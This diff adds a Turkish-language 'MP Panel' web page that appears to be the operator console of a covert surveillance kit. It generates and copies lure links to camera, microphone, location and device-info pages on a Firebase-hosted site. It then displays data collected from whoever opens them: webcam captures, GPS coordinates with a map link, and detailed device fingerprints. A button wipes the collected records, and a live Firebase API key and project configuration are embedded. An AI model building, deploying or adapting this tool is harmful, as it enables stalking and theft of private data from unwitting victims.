@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yönetim Paneli | Central Control v6.8</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #0a0f1d; color: #f1f5f9; font-family: 'Consolas', 'Courier New', monospace; padding: 15px; }
+        .wrapper { max-width: 1200px; margin: 0 auto; }
+        
+        h1 { font-size: 1.5rem; color: #38bdf8; margin-bottom: 25px; text-transform: uppercase; border-left: 5px solid #38bdf8; padding-left: 12px; letter-spacing: 1px; line-height: 1.3; }
+        h3 { font-size: 0.9rem; margin-bottom: 15px; color: #94a3b8; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; text-transform: uppercase; }
+
+        /* Link Dağıtım Alanı */
+        .link-generator { background: linear-gradient(135deg, rgba(30, 41, 59, 0.5), rgba(15, 23, 42, 0.8)); border: 1px solid rgba(56, 189, 248, 0.2); padding: 20px; border-radius: 12px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .gen-buttons { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        
+        .btn-gen { background: rgba(0,0,0,0.4); border: 2px solid #38bdf8; color: #38bdf8; padding: 12px 10px; border-radius: 6px; cursor: pointer; font-family: inherit; font-weight: bold; font-size: 0.85rem; transition: all 0.25s ease; text-transform: uppercase; text-align: center; }
+        .btn-gen:hover { background: #38bdf8; color: #0a0f1d; box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); }
+        
+        /* Çıktı ve Kopyalama Alanı */
+        .output-container { background: #040711; border: 1px solid #1e293b; border-radius: 6px; padding: 8px; display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
+        .active-tag { background: #1e293b; color: #94a3b8; padding: 8px 12px; font-size: 0.75rem; border-radius: 4px; font-weight: bold; text-transform: uppercase; white-space: nowrap; border: 1px solid rgba(255,255,255,0.05); text-align: center; }
+        .link-output { flex: 1; min-width: 150px; padding: 8px; background: transparent; border: none; color: #10b981; font-size: 0.9rem; font-weight: bold; font-family: inherit; outline: none; overflow: hidden; text-overflow: ellipsis; }
+        
+        .btn-copy { background: #1e293b; color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); padding: 8px 16px; font-size: 0.8rem; border-radius: 4px; font-weight: bold; cursor: pointer; font-family: inherit; text-transform: uppercase; transition: all 0.2s ease; white-space: nowrap; margin-left: auto; }
+        .btn-copy:hover { background: rgba(56, 189, 248, 0.1); border-color: #38bdf8; }
+
+        /* Panellerin Responsive Grid Düzeni */
+        .panels-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 25px; }
+        .monitor-box { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 18px; backdrop-filter: blur(12px); }
+        .data-display { font-size: 0.85rem; line-height: 1.6; color: #cbd5e1; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 8px; min-height: 120px; word-break: break-all; border: 1px solid rgba(255,255,255,0.02); }
+        
+        #cam-preview { width: 100%; max-height: 190px; object-fit: cover; margin-top: 12px; border-radius: 6px; display: none; border: 2px solid #ef4444; box-shadow: 0 0 10px rgba(239, 68, 68, 0.2); }
+        
+        /* Temizleme Butonu */
+        .clear-container { text-align: center; margin-top: 15px; }
+        .btn-clear { background: transparent; color: #ef4444; border: 2px solid #ef4444; padding: 10px 30px; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-family: inherit; letter-spacing: 1px; transition: all 0.2s ease; font-size: 0.85rem; }
+        .btn-clear:hover { background: #ef4444; color: #fff; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); }
+
+        /* Telefonlar İçin Ekstra Düzenlemeler */
+        @media (max-width: 480px) {
+            .output-container { flex-direction: column; align-items: stretch; }
+            .link-output { text-align: center; border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); padding: 12px 0; }
+            .btn-copy { margin-left: 0; width: 100%; padding: 10px; text-align: center; }
+            .active-tag { width: 100%; }
+        }
+    </style>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
+        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCoLOm-kJrfENI3AHc_FUM9tVwo8Kpkri0",
+            authDomain: "sohbet-7c3b5.firebaseapp.com",
+            databaseURL: "https://sohbet-7c3b5-default-rtdb.firebaseio.com",
+            projectId: "sohbet-7c3b5",
+            storageBucket: "sohbet-7c3b5.firebasestorage.app",
+            messagingSenderId: "879064512430",
+            appId: "1:879064512430:web:78dda057c8fb7a7b98fa3f",
+            measurementId: "G-89T42RBSSB"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const moduleLinks = {
+            kamera: "https://sohbet-7c3b5.web.app/kamera.html",
+            ses:    "https://sohbet-7c3b5.web.app/ses.html",
+            konum:  "https://sohbet-7c3b5.web.app/konum.html",
+            cihaz:  "https://sohbet-7c3b5.web.app/cihaz.html"
+        };
+
+        window.selectModule = function(type, labelText, color) {
+            const outputField = document.getElementById('output-url');
+            const tagField = document.getElementById('active-module-tag');
+            const copyBtn = document.getElementById('btn-copy-action');
+            
+            outputField.value = moduleLinks[type] || "";
+            tagField.innerText = labelText;
+            tagField.style.color = color;
+            tagField.style.borderColor = color;
+            
+            copyBtn.innerText = "KOPYALA";
+            copyBtn.style.background = "#1e293b";
+            copyBtn.style.color = "#38bdf8";
+            copyBtn.style.borderColor = "rgba(56, 189, 248, 0.3)";
+        };
+
+        window.copyToClipboard = function() {
+            const outputField = document.getElementById('output-url');
+            const copyBtn = document.getElementById('btn-copy-action');
+            if(!outputField.value) return;
+
+            navigator.clipboard.writeText(outputField.value).then(() => {
+                copyBtn.innerText = "KOPYALANDI!";
+                copyBtn.style.background = "#10b981";
+                copyBtn.style.color = "#040711";
+                copyBtn.style.borderColor = "#10b981";
+            }).catch(err => { console.error("Hata: ", err); });
+        };
+
+        // Canlı Veri Akışı Dinleyicisi
+        onValue(ref(db, 'sistem_verileri'), (snapshot) => {
+            const data = snapshot.val();
+            if(!data) {
+                resetPanels();
+                return;
+            }
+
+            // Kamera
+            if(data.kamera) {
+                document.getElementById('pane-kamera').innerHTML = `<span style="color:#ef4444; font-weight:bold;">DURUM:</span> ${data.kamera.durum || 'Aktif'}`;
+                if(data.kamera.resim) {
+                    const img = document.getElementById('cam-preview');
+                    img.src = data.kamera.resim;
+                    img.style.display = "block";
+                }
+            }
+
+            // Ses
+            if(data.ses) {
+                document.getElementById('pane-ses').innerHTML = `<span style="color:#a855f7; font-weight:bold;">DURUM:</span> ${data.ses.durum || 'Aktif'}`;
+            }
+
+            // Konum
+            if(data.konum) {
+                if(data.konum.enlem && data.konum.boylam) {
+                    document.getElementById('pane-konum').innerHTML = `
+                        <span style="color:#10b981; font-weight:bold;">DURUM:</span> ${data.konum.durum}<br>
+                        <span style="color:#94a3b8;">ENLEM:</span> ${data.konum.enlem}<br>
+                        <span style="color:#94a3b8;">BOYLAM:</span> ${data.konum.boylam}<br><br>
+                        <a href="https://maps.google.com/?q=${data.konum.enlem},${data.konum.boylam}" target="_blank" style="color:#10b981; font-weight:bold; text-decoration:underline;">Haritada Doğrula →</a>
+                    `;
+                } else {
+                    document.getElementById('pane-konum').innerHTML = `<span style="color:#ef4444; font-weight:bold;">HATA:</span> ${data.konum.durum || 'Veri Yok'}`;
+                }
+            }
+
+            // Gelişmiş Tüm Cihaz Bilgilerini Gösterme Sahası
+            if(data.cihaz) {
+                document.getElementById('pane-cihaz').innerHTML = `
+                    <span style="color:#f59e0b; font-weight:bold;">DURUM:</span> ${data.cihaz.durum}<br>
+                    <span style="color:#38bdf8; font-weight:bold;">[ DONANIM BİLGİLERİ ]</span><br>
+                    <span style="color:#94a3b8;">İŞLEMCİ:</span> ${data.cihaz.cores} Çekirdek (Mimarisi platformda)<br>
+                    <span style="color:#94a3b8;">RAM (BELLEK):</span> ${data.cihaz.ram !== "Bilinmiyor (Bkz. UserAgent)" ? data.cihaz.ram + " GB Yaklaşık" : "Kilitli (Bkz. UA)"}<br>
+                    <span style="color:#94a3b8;">GRAFİK (GPU):</span> ${data.cihaz.gpu}<br>
+                    
+                    <span style="color:#38bdf8; font-weight:bold; display:block; margin-top:5px;">[ EKRAN & PİKSEL ]</span>
+                    <span style="color:#94a3b8;">MANTIKSAL ÇÖZ.:</span> ${data.cihaz.scrWidth}x${data.cihaz.scrHeight}<br>
+                    <span style="color:#94a3b8;">FİZİKSEL (NET):</span> ${data.cihaz.scrRealWidth}x${data.cihaz.scrRealHeight} Piksel<br>
+                    <span style="color:#94a3b8;">PİKSEL ORANI (DPR):</span> ${data.cihaz.pixelRatio}x Yoğunluk<br>
+                    <span style="color:#94a3b8;">RENK DERİNLİĞİ:</span> ${data.cihaz.colorDepth} Bit<br>
+                    
+                    <span style="color:#38bdf8; font-weight:bold; display:block; margin-top:5px;">[ YAZILIM & SİSTEM ]</span>
+                    <span style="color:#94a3b8;">İŞLETİM SİSTEMİ:</span> ${data.cihaz.plat}<br>
+                    <span style="color:#94a3b8;">SİSTEM DİLİ:</span> ${data.cihaz.lang}<br>
+                    <span style="color:#94a3b8;">AĞ DURUMU:</span> ${data.cihaz.online}<br>
+                    <span style="color:#94a3b8;">SAĞLAYICI:</span> ${data.cihaz.vendor}<br>
+                    
+                    <span style="font-size:0.7rem; color:#64748b; display:block; margin-top:8px; border-top:1px solid rgba(255,255,255,0.05); padding-top:5px; word-break:break-all;"><b>TAM UA:</b> ${data.cihaz.ua}</span>
+                `;
+            }
+        });
+
+        function resetPanels() {
+            document.getElementById('pane-kamera').innerText = "Veri bekleniyor...";
+            document.getElementById('cam-preview').style.display = "none";
+            document.getElementById('pane-ses').innerText = "Veri bekleniyor...";
+            document.getElementById('pane-konum').innerText = "Veri bekleniyor...";
+            document.getElementById('pane-cihaz').innerText = "Veri bekleniyor...";
+        }
+
+        document.getElementById('clear-db').onclick = function() {
+            if(confirm("Tüm izleme verileri sıfırlansın mı?")) {
+                remove(ref(db, 'sistem_verileri')).then(() => {
+                    alert("Veritabanı temizlendi.");
+                    resetPanels();
+                });
+            }
+        };
+    </script>
+</head>
+<body>
+
+    <div class="wrapper">
+        <h1>MP Panel</h1>
+        
+        <div class="link-generator">
+            <h3>[ ÖZELLİK SEÇİMİ VE DAĞITIM ALANI ]</h3>
+            <div class="gen-buttons">
+                <button class="btn-gen" style="border-color:#ef4444; color:#ef4444;" onclick="selectModule('kamera', 'Kamera Modülü', '#ef4444')">Kamera</button>
+                <button class="btn-gen" style="border-color:#a855f7; color:#a855f7;" onclick="selectModule('ses', 'Mikrofon', '#a855f7')">Mikrofon</button>
+                <button class="btn-gen" style="border-color:#10b981; color:#10b981;" onclick="selectModule('konum', 'Konum Modülü', '#10b981')">Konum</button>
+                <button class="btn-gen" style="border-color:#f59e0b; color:#f59e0b;" onclick="selectModule('cihaz', 'Cihaz Modülü', '#f59e0b')">Cihaz Bilgisi</button>
+            </div>
+            
+            <div class="output-container">
+                <div class="active-tag" id="active-module-tag">Seçim Yapılmadı</div>
+                <input type="text" id="output-url" class="link-output" readonly placeholder="Seçilen özelliğin linki arka planda buraya yüklenir...">
+                <button class="btn-copy" id="btn-copy-action" onclick="copyToClipboard()">Kopyala</button>
+            </div>
+        </div>
+
+        <div class="panels-grid">
+            <div class="monitor-box" style="border-top: 3px solid #ef4444;">
+                <h3 style="color:#ef4444;">[ KAMERA PANELİ ]</h3>
+                <div class="data-display" id="pane-kamera">Veri bekleniyor...</div>
+                <img id="cam-preview" src="" alt="Yakalama Alanı">
+            </div>
+
+            <div class="monitor-box" style="border-top: 3px solid #a855f7;">
+                <h3 style="color:#a855f7;">[ SES PANELİ ]</h3>
+                <div class="data-display" id="pane-ses">Veri bekleniyor...</div>
+            </div>
+
+            <div class="monitor-box" style="border-top: 3px solid #10b981;">
+                <h3 style="color:#10b981;">[ KONUM PANELİ ]</h3>
+                <div class="data-display" id="pane-konum">Veri bekleniyor...</div>
+            </div>
+
+            <div class="monitor-box" style="border-top: 3px solid #f59e0b;">
+                <h3 style="color:#f59e0b;">[ CİHAZ PANELİ ]</h3>
+                <div class="data-display" id="pane-cihaz" style="line-height: 1.5;">Veri bekleniyor...</div>
+            </div>
+        </div>
+
+        <div class="clear-container">
+            <button class="btn-clear" id="clear-db">Veritabanını Temizle</button>
+        </div>
+    </div>
+
+</body>
+</html>
